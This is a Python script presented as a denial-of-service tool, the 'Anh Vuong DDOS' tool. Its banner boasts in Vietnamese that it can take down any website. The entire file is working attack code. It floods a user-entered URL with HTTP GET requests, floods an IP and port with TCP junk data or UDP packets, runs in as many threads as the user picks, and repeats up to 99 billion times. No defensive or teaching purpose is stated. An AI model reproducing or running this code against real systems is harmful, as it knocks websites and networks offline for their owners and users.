import threading
import requests
import socket
import time
import os
import platform
from colorama import init, Fore, Back, Style

init(autoreset=True)

REQUEST_COUNT = 99_000_000_000

def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def gradient_color(text, color1, color2, split_point):
    """
    Mix two colors for gradient effect.
    """
    first_half = text[:split_point]
    second_half = text[split_point:]
    return Fore.RED + first_half + Fore.BLUE + second_half

def print_banner():
    banner = [
        "     _    _   _ _   _  __     ___   _  ___  _   _  ____   _   _    _    ____ _  _______ ____  ",
        "    / \  | \ | | | | | \ \   / / | | |/ _ \| \ | |/ ___| | | | |  / \  / ___| |/ / ____|  _ \ ",
        "   / _ \ |  \| | |_| |  \ \ / /| | | | | | |  \| | |  _  | |_| | / _ \| |   | ' /|  _| | |_) |",
        "  / ___ \| |\  |  _  |   \ V / | |_| | |_| | |\  | |_| | |  _  |/ ___ \ |___| . \| |___|  _ < ",
        " /_/   \_\_| \_|_| |_|    \_/   \___/ \___/|_| \_|\____| |_| |_/_/   \_\____|_|\_\_____|_| \_\ \n",
        "Anh Vuong DDOS | Attacking | Tool DDOS Vip !",
        "Developer By : Anh Vuong DDOS",
        "NAME TOOL: TOOL DDOS   ",
        "Thông Tin : Đánh Bay Mọi Loại WebSite , Gặp Anh Tắt Điện",
        ""
    ]

    for line in banner:
        half_point = len(line) // 2
        print(gradient_color(line, Fore.RED, Fore.BLUE, half_point))

def http_spam(url):
    for _ in range(REQUEST_COUNT):
        try:
            response = requests.get(url)
            print(f"Attack For {url} - Status: {response.status_code}")
        except requests.RequestException as e:
            print(f"Attack Error")
        time.sleep(0.001)

def tcp_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        print(f"Connected to {ip}:{port}")
        for _ in range(REQUEST_COUNT):
            try:
                sock.send(b"X" * 1024)
                print(f"Attack For {ip}:{port}")
            except Exception as e:
                print(f"Error !")
            time.sleep(0.001)
    except Exception as e:
        print(f"Connection error !")
    finally:
        sock.close()

def wifi_flood(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print(f"Start For {ip}:{port}")
        for _ in range(REQUEST_COUNT):
            try:
                sock.sendto(b"X" * 1024, (ip, port))
                print(f"Attack For {ip}:{port}")
            except Exception as e:
                print(f"Error !")
            time.sleep(0.001)
    except Exception as e:
        print(f"Error !")
    finally:
        sock.close()

def main():
    os.system("title Flooding Attacking By Anh Vuong")
    clear_screen()
    print_banner()
    
    print("Please Select Attack Method !")
    print("1, HTTP-FLOOD")
    print("2, TCP-FLOOD")
    print("3, WIFI-FLOOD")
    choice = input("AnhVuongHacker@Attack~$: ")

    if choice == '1':
        url = input("Enter Target: ")
        thread_count = int(input("Thread: "))

        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=http_spam, args=(url,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    elif choice == '2':
        ip = input("Enter IP: ")
        port = int(input("Enter Port: "))
        thread_count = int(input("Thread: "))

        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=tcp_flood, args=(ip, port))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    elif choice == '3':
        ip = input("Enter IP Wifi: ")
        port = int(input("Enter Port [53/80]: "))
        thread_count = int(input("Enter Thread: "))

        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=wifi_flood, args=(ip, port))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    else:
        print("Choose the Right Method!.")

if __name__ == "__main__":
    main()
